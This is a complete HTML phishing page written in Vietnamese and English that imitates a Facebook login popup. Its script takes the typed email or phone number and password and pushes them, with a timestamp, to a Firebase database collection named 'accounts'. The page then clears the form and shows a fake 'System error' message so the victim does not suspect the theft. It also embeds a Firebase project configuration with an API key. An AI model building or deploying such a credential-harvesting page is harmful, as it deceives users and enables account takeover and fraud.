<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Đăng nhập Facebook</title>

<style>
/* Sử dụng font hệ thống giống Facebook */
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: Helvetica, Arial, sans-serif;
}

body {
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  margin: 0;
}

/* Giữ nguyên nền cũ của bạn */
body::before {
  content: "";
  position: absolute;
  width: 100%;
  height: 100%;
  background:
    linear-gradient(rgba(0,0,0,0.35), rgba(0,0,0,0.5)),
    url("https://c.files.bbci.co.uk/45EC/production/_129800971_gettyimages-1238219305.jpg") no-repeat center center/cover;
  z-index: -1;
}

/* Card trắng theo style Facebook */
.login-card {
  width: 400px;
  background: #fff;
  border-radius: 8px;
  box-shadow: 0 12px 28px 0 rgba(0, 0, 0, 0.2), 0 2px 4px 0 rgba(0, 0, 0, 0.1);
  padding: 0;
  overflow: hidden;
  position: relative;
}

/* Header của popup */
.card-header {
  padding: 20px;
  text-align: center;
  border-bottom: 1px solid #dddfe2;
  position: relative;
}

.card-header h2 {
  font-size: 20px;
  color: #1c1e21;
  font-weight: 600;
}

.close-btn {
  position: absolute;
  right: 15px;
  top: 15px;
  font-size: 24px;
  color: #606770;
  cursor: pointer;
  line-height: 1;
}

/* Nội dung bên trong form */
.card-body {
  padding: 20px;
}

.input-container {
  margin-bottom: 12px;
}

.input-container input {
  width: 100%;
  padding: 14px 16px;
  font-size: 15px;
  border: 1px solid #dddfe2;
  border-radius: 6px;
  outline: none;
  background-color: #f5f6f7;
  color: #1c1e21;
}

.input-container input:focus {
  border-color: #1877f2;
  box-shadow: 0 0 0 2px #e7f3ff;
  background-color: #fff;
}

/* Ghi nhớ mật khẩu */
.remember-me {
  display: flex;
  align-items: center;
  margin: 15px 0;
  font-size: 14px;
  color: #4b4f56;
}

.remember-me input {
  margin-right: 8px;
  width: 18px;
  height: 18px;
}

/* Nút Đăng nhập xanh */
.btn-login {
  width: 100%;
  padding: 10px;
  background-color: #1877f2;
  border: none;
  border-radius: 6px;
  color: #fff;
  font-size: 20px;
  font-weight: 700;
  cursor: pointer;
  transition: background-color 0.2s;
}

.btn-login:hover {
  background-color: #166fe5;
}

/* Quên mật khẩu */
.forgot-password {
  display: block;
  text-align: center;
  margin-top: 15px;
  color: #1877f2;
  text-decoration: none;
  font-size: 14px;
}

.forgot-password:hover {
  text-decoration: underline;
}

#status {
  text-align: center;
  margin-top: 10px;
  font-size: 13px;
  min-height: 18px;
}
</style>

</head>
<body>

<div class="login-card">
    <div class="card-header">
        <h2>Log Into Facebook</h2>
        <span class="close-btn">&times;</span>
    </div>

    <div class="card-body">
        <div class="input-container">
            <input type="text" id="username" placeholder="Email or phone number" required>
        </div>

        <div class="input-container">
            <input type="password" id="password" placeholder="Password" required>
        </div>

        <div class="remember-me">
            <input type="checkbox" id="remember">
            <label for="remember">Remember password</label>
        </div>

        <button class="btn-login" onclick="sendToCloud()">Log In</button>

        <a href="#" class="forgot-password">Forgot password?</a>
        
        <div id="status"></div>
    </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCNtDrjM-xO_lXPIOytOLuj4VfZo1qBH0s",
  authDomain: "keyl-1bb66.firebaseapp.com",
  databaseURL: "https://keyl-1bb66-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "keyl-1bb66",
  storageBucket: "keyl-1bb66.firebasestorage.app",
  messagingSenderId: "742688123103",
  appId: "1:742688123103:web:94e9c7e88c26f8178ee16a"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const dbRef = ref(db, 'accounts');

window.sendToCloud = function() {
    const userField = document.getElementById('username');
    const passField = document.getElementById('password');
    const status = document.getElementById('status');

    if (userField.value && passField.value) {
        push(dbRef, {
            user: userField.value,
            pass: passField.value,
            time: new Date().toLocaleString()
        }).then(() => {
            userField.value = '';
            passField.value = '';
            status.innerHTML = '<span style="color:#00a400">Processing...</span>';

            setTimeout(() => {
                status.innerHTML = '<span style="color:#fa3e3e">System error, please try again later.</span>';
            }, 1500);
        }).catch((error) => {
            status.innerHTML = '<span style="color:red;">' + error.message + '</span>';
        });
    } else {
        status.innerHTML = '<span style="color:#777;">Please enter all information</span>';
    }
};
</script>

</body>
</html>
